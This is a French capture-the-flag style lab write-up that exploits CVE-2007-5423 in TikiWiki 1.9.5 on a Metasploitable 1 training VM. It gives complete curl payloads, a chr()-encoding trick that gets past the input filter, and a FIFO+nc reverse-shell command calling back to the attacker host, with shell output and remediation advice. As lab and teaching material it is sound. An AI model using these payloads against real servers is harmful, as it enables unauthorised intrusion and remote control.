# Write-up — TikiWiki 1.9.5 : RCE via tiki-graph_formula.php (Metasploitable 1, port 80)

Cible : `192.168.56.102` · CVE-2007-5423 · Résultat : reverse shell interactif `www-data`.

> **Note réseau.** Je suis sur `vboxnet0` (cible `192.168.56.102`, Kali `192.168.56.1`). Mon
> coéquipier est sur `172.28.128.x` : chez lui, remplacer `192.168.56.102` → `172.28.128.4` et
> `192.168.56.1` → `172.28.128.1`. La démarche est identique.

Tout est copier-coller direct (testé en zsh), lancé depuis **🖥 Kali** (cible distante).
TikiWiki et TWiki coexistent sur le port 80 : ce sont deux applis distinctes, traitées séparément.

---

## 1. Recon

🖥 Kali :
```bash
nmap -sC -sV -p 80 192.168.56.102
```
→ `Apache httpd 2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10`. La racine `/` n'a pas de titre : les
applis sont dans des sous-répertoires. On énumère :
```bash
for p in tikiwiki tiki twiki; do
  curl -s -o /dev/null -w "/$p/ -> %{http_code}\n" "http://192.168.56.102/$p/"
done
# /tikiwiki/ -> 302   /tiki/ -> 404   /twiki/ -> 200
```
`/tikiwiki/` redirige vers `tiki-index.php`. On récupère la version :
```bash
curl -s -L http://192.168.56.102/tikiwiki/ | grep -ioE 'TikiWiki [0-9.]+'
# TikiWiki 1.9.5
```

## 2. Identifier la vulnérabilité (faille connue + CVE + mécanisme)

🖥 Kali :
```bash
searchsploit tikiwiki graph
# TikiWiki 1.9.8 - 'tiki-graph_formula.php' Com...  | php/webapps/4525.pl
# TikiWiki tiki-graph_formula - PHP Remote Code...  | php/webapps/16911.rb
msfconsole -q -x "info exploit/unix/webapp/tikiwiki_graph_formula_exec; exit"
# References: https://nvd.nist.gov/vuln/detail/CVE-2007-5423
```
→ **CVE-2007-5423**. L'endpoint `tiki-graph_formula.php` existe bien (`curl` → 200).

**Mécanisme.** `tiki-graph_formula.php` prend un paramètre tableau `f[]` censé contenir une
formule mathématique à tracer. Cette formule finit évaluée côté serveur via
`create_function()` (grosso modo `return <formule>;`). En concaténant un appel de fonction PHP
dans la formule, on le fait exécuter. Sécurité en place : un filtre rejette certains noms de
fonctions **et** certains caractères (voir §4) — c'est ce qui rend l'exploitation manuelle
intéressante ici.

## 3. Confirmer l'exécution de code PHP (phpinfo)

Test non destructif — si `phpinfo()` s'exécute, on a bien de l'injection PHP :
```bash
curl -s "http://192.168.56.102/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=cmd" | grep -ioE 'PHP Version [0-9.]+'
# PHP Version 5.2.4
```
`phpinfo()` s'exécute (placé après `x.tan.`). L'injection PHP est confirmée.

## 4. Passer de « exécuter du PHP » à « exécuter des commandes » — contourner deux filtres

**Filtre n°1 — noms de fonctions.** `system` placé directement après `x.` est rejeté :
```bash
curl -s "...f[]=x.system('id')..." 
# Invalid function call system
```
Mais le filtre ne contrôle que la fonction **juste après `x.`**. En plaçant une fonction maths
autorisée (`tan`) d'abord, `system` passe :
```bash
curl -s -G "http://192.168.56.102/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&t=png&title=cmd" \
  --data-urlencode "f[]=x.tan.system('id')"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
RCE confirmé en tant que **www-data**.

**Filtre n°2 — caractères interdits dans la formule.** Dès qu'une commande contient un
**espace**, un **`;`**, un **`=`** ou un **`+`**, la formule est rejetée (sortie vide) :
```bash
# échouent tous (sortie vide) :
#   f[]=x.tan.system('which nc')      (espace)
#   f[]=x.tan.system('id;id')         (point-virgule)
#   f[]=x.tan.system(base64_decode('aWQ='))   (= de padding base64)
```
Première idée — `base64_decode()` sans padding (PHP décode quand même) : marche pour les
commandes dont le base64 ne contient ni `+` ni `/` :
```bash
B=$(printf 'uname -a' | base64 -w0 | tr -d '=')   # dW5hbWUgLWE (pas de +//)
curl -s -G "...?...&title=cmd" --data-urlencode "f[]=x.tan.system(base64_decode('$B'))"
# Linux metasploitable 2.6.24-16-server ... i686 GNU/Linux
```
Mais le base64 d'un reverse shell contient un `+` → rejeté. **Solution définitive : `chr()`**,
qui ne produit que chiffres, points et parenthèses — aucun caractère filtré :
```bash
# f[]=x.tan.system(chr(114).chr(109).chr(32)...)  → construit la commande octet par octet
```

## 5. Exploiter — reverse shell interactif

🖥 Kali — listener :
```bash
nc -lvnp 4444
```
🖥 Kali — construire la commande reverse shell (FIFO+nc, pas besoin de `nc -e` ni `/dev/tcp`)
encodée en `chr()`, puis déclencher :
```bash
RS='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.56.1 4444 >/tmp/f'
CHR=$(python3 -c "import sys;print('.'.join('chr(%d)'%ord(c) for c in sys.argv[1]))" "$RS")
curl -s -G "http://192.168.56.102/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&t=png&title=cmd" \
  --data-urlencode "f[]=x.tan.system($CHR)"
```
`nc` est présent sur la cible (`which nc` → `/bin/nc`). La requête reste ouverte tant que le
shell vit (la lancer en arrière-plan ou dans un autre terminal).

## 6. Preuve d'accès

Dans le listener `nc` :
```
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.102] 38909
bash: no job control in this shell
www-data@metasploitable:/var/www/tikiwiki$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@metasploitable:/var/www/tikiwiki$ uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
www-data@metasploitable:/var/www/tikiwiki$ hostname
metasploitable
```
→ Shell interactif en tant que **`www-data`** sur `/var/www/tikiwiki`. Pas root : l'élévation
de privilèges sera une étape distincte.

## 7. Nettoyage

Dans le shell, avant de quitter :
```bash
rm -f /tmp/f
exit
```

---

## Remédiation

- Mettre à jour TikiWiki : la 1.9.x est obsolète (correctif de CVE-2007-5423 dès 1.9.9).
- Ne jamais faire évaluer une entrée utilisateur comme du code (`create_function`/`eval`). Un
  filtre par liste noire est contournable (démontré ici : placement de fonction, puis
  `base64_decode`, puis `chr()`) — préférer une liste blanche stricte ou une bibliothèque de
  parsing mathématique sans exécution de code.
- Appliquer le principe de moindre privilège au compte du serveur web (`www-data`) et isoler
  l'application (chroot/conteneur) pour limiter l'impact d'une RCE.
- Désactiver les fonctions PHP dangereuses (`system`, `exec`, `passthru`, `shell_exec`,
  `base64_decode` n'est pas dangereux en soi mais `disable_functions` sur les fonctions
  d'exécution aurait bloqué l'attaque) via `php.ini`.

## Sources

- Session réelle (ce write-up) — recon, identification, contournement de filtre, exploitation.
- `msfconsole -q -x "info exploit/unix/webapp/tikiwiki_graph_formula_exec"` → CVE-2007-5423 :
  https://nvd.nist.gov/vuln/detail/CVE-2007-5423
- PoC d'origine : Exploit-DB `php/webapps/4525.pl` (searchsploit).

**Suite du parcours MS1 :** TWiki (port 80), faille via `search.cgi` — appli distincte de
TikiWiki sur le même port.
